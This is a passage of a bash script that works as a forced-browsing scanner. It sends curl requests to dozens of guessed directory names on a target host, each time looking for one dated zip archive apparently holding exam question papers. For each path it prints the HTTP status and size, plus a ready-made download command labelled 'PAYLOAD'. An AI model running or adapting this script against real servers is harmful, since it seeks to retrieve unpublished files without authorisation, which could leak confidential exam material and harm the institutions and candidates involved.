${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper_BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloud_DataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloud_DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloud_DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessor-QPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessor-QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessor-QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase-Handler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase-Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase-Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Processing-QstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Processing-QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Processing-QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFileDataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFileDataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFileDataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Monitoring-QstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Monitoring-QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Monitoring-QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSyncQPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSyncQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSyncQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper_AccessControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper_AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper_AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Workflow-QPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Workflow-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Workflow-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModule_QPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModule_QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModule_QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader_FileUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader_FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader_FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManager-QP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManager-QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManager-QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Dashboard_QPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Dashboard_QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Dashboard_QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringTool_QstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringTool_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringTool_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Service-ExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Service-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Service-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Ops-QPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Ops-QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Ops-QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManagerQPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManagerQPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManagerQPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadServiceQPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadServiceQPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadServiceQPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFileUploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFileUploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFileUploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation-QPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation-QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation-QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc-Management/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc-Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc-Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto_Manager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto_Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto_Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SyncQPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SyncQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SyncQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUpload-QPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUpload-QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUpload-QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MgmtQP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MgmtQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MgmtQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [OpsQPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}OpsQPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}OpsQPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP_Sync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP_Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP_Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper-Platform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Suite_QstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Suite_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Suite_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUpload-QPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUpload-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUpload-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManager-QPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManager-QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManager-QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploadAutomationSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploadAutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploadAutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUpload_QstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUpload_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUpload_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Uploader_QPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Uploader_QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Uploader_QPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Module-QPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Module-QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Module-QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModule-QP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModule-QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModule-QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster_AutomationSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster_AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster_AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Module-QPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Module-QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Module-QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
